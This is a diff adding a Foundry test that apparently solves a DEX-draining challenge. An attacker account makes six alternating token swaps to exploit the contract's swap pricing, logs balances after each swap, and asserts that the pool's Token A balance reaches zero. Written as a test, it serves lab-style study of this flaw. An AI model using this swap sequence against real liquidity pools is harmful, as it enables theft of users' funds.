@@ -29,6 +29,55 @@ contract DexTest is Test {
         vm.label(attacker, "Attacker");
     }
 
-    
+    function test_drainTokenA() public {
+        vm.startPrank(attacker);
+        
+        // Approve DEX to spend tokens
+        swappabletokenA.approve(address(dex), type(uint256).max);
+        swappabletokenB.approve(address(dex), type(uint256).max);
 
+        // Log initial state
+        console.log("\nInitial state:");
+        logState();
+
+        // First swap: token1 -> token2
+        console.log("\nStarting attack sequence...");
+        
+        // Execute the drain through multiple swaps
+        dex.swap(address(swappabletokenA), address(swappabletokenB), 10);
+        console.log("\nAfter swap 1:");
+        logState();
+
+        dex.swap(address(swappabletokenB), address(swappabletokenA), 20);
+        console.log("\nAfter swap 2:");
+        logState();
+
+        dex.swap(address(swappabletokenA), address(swappabletokenB), 24);
+        console.log("\nAfter swap 3:");
+        logState();
+
+        dex.swap(address(swappabletokenB), address(swappabletokenA), 30);
+        console.log("\nAfter swap 4:");
+        logState();
+
+        dex.swap(address(swappabletokenA), address(swappabletokenB), 41);
+        console.log("\nAfter swap 5:");
+        logState();
+
+        dex.swap(address(swappabletokenB), address(swappabletokenA), 45);
+        console.log("\nFinal state:");
+        logState();
+
+        vm.stopPrank();
+
+        // Verify Token A has been drained
+        assertEq(IERC20(address(swappabletokenA)).balanceOf(address(dex)), 0, "DEX should have 0 Token A");
+    }
+
+    function logState() internal view {
+        console.log("DEX Token A balance:", IERC20(address(swappabletokenA)).balanceOf(address(dex)));
+        console.log("DEX Token B balance:", IERC20(address(swappabletokenB)).balanceOf(address(dex)));
+        console.log("Attacker Token A balance:", IERC20(address(swappabletokenA)).balanceOf(attacker));
+        console.log("Attacker Token B balance:", IERC20(address(swappabletokenB)).balanceOf(attacker));
+    }
 }
